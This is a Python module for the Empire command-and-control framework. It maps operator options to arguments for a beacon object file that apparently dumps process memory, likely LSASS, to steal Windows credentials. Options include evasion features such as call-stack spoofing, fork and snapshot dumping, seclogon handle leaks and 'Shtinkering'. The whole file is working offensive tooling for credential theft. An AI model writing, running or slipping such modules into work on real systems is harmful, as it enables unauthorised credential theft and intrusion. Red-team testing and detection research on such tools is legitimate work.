from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        params_dict = {
            "Architecture": "x64",
            "ProcessID": f"-i:{'1' if params.get('getpid') == 'true' else '0'}",
            "DumpPath": f"-z:{params.get('write', 'find_me.dmp')}",
            "WriteFile": f"-i:{'1' if params.get('write') else '0'}",
            "ValidSignature": f"-i:{'1' if params.get('valid') == 'true' else '0'}",
            "Fork": f"-i:{'1' if params.get('fork') == 'true' else '0'}",
            "Snapshot": f"-i:{'1' if params.get('snapshot') == 'true' else '0'}",
            "DuplicateHandle": f"-i:{'1' if params.get('duplicate') == 'true' else '0'}",
            "ElevateHandle": f"-i:{'1' if params.get('elevate-handle') == 'true' else '0'}",
            "DuplicateElevate": f"-i:{'1' if params.get('duplicate-elevate') == 'true' else '0'}",
            "GetPID": f"-i:{'1' if params.get('getpid') == 'true' else '0'}",
            "SecLogonLeakLocal": f"-i:{'1' if params.get('seclogon-leak-local') == 'true' else '0'}",
            "SecLogonLeakRemote": f"-i:{'1' if params.get('seclogon-leak-remote') == 'true' else '0'}",
            "SecLogonLeakRemoteBinary": f"-z:{'0' if params.get('seclogon-leak-remote') == 'true' else ''}",
            "SecLogonDuplicate": f"-i:{'1' if params.get('seclogon-duplicate') == 'true' else '0'}",
            "SpoofCallstack": f"-i:{'1' if params.get('spoof-callstack') == 'true' else '0'}",
            "SilentProcessExit": f"-i:{'1' if params.get('silent-process-exit') else '0'}",
            "SilentProcessExitBinary": f"-z:{params.get('silent-process-exit', '')}",
            "Shtinkering": f"-i:{'1' if params.get('shtinkering') == 'true' else '0'}",
        }

        return main_menu.modulesv2.generate_script_bof(
            module=module, params=params_dict, obfuscate=obfuscate
        )
